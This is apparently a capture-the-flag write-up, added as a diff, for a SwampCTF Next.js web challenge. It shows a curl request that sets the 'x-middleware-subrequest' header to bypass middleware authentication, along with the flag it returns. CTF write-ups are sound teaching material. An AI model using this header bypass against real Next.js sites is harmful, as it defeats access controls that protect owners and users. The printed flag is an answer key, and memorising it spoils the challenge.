@@ -1,0 +1,24 @@
+* Description 
+The Gator research institute asked me to develop an app for them. I've been hearing a lot of hullabaloo recently
+about Next.js, so I decide to make my app inspired by their code. Can you see if you can access the flag?
+Authentication hasn't been implemented yet, so you'll need to find a way around it.
+
+http://chals.swampctf.com:43611
+
+* Solution
+
+[[file:clipboard-20250404T164433.png]]
+
+This hint us that we may need to be a server-side middleware to access the admin panel. And there is a HTTP header
+~x-middleware-subrequest~ which can be exploited.
+
+[[file:clipboard-20250404T171149.png]]
+
+In this request sequences, we get this api endpoint which fetch ~/flag~ backend
+
+#+begin_src sh
+> curl 'http://chals.swampctf.com:43611/api/protected/flag' -H 'x-middleware-subrequest: 1'
+{"message":"Congratulations, you found the secret middleware bypass!","flag":"swampCTF{b3w4r3_th3_m1ddl3w4r3}"}
+#+end_src
+
+[[file:clipboard-20250404T170957.png]]
